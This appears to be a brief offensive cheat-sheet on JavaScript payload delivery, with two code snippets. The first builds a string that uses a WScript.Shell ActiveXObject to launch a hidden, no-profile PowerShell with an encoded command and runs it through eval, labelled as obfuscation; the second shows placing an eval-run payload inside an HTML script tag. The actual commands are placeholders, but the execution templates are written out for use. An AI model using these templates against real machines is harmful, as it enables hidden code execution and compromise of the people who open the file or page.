# JavaScript

### 1) Obfuscated JavaScript

    var cmd = "";
    cmd += "var shell = new ActiveXObject('WScript.Shell');";
    cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
    eval(cmd);

### 2) Embedding JavaScript payloads in HTML documents

    <script>
        var cmd = "[Your JavaScript Command]";
        eval(cmd);
    </script>
